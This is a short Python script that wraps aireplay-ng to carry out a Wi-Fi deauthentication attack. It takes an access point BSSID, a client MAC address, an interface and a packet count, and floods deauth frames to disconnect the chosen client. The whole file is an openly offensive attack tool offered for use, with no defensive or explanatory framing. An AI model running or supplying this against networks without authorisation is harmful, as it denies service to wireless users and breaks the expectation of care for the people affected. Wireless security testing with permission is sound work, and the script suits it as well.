import subprocess
import argparse


def get_input():
    """Get input"""
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--client_bssid", help="specify client BSSID")
    parser.add_argument("-i", "--interface", help="specify interface")
    parser.add_argument("-p", "--deauth_pack", type=int, help="specify number of deauth packets")
    parser.add_argument("-c", "--client_mac", help="specify client MAC address")
    args = parser.parse_args()

    if not all([args.client_bssid, args.interface, args.deauth_pack, args.client_mac]):
        parser.error("[-] Please provide all the required arguments. Use --help for more information.")

    return args


def deauth_attack(client_bssid, deauth_pack, client_mac, interface):
    '''Deauth attack function'''
    print(f'Deauth attack against {client_bssid} on {client_mac} using {interface}')
    subprocess.run(['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, interface],
                   check=True)


def main():
    options = get_input()
    deauth_attack(options.client_bssid, options.deauth_pack, options.client_mac, options.interface)


if __name__ == "__main__":
    main()
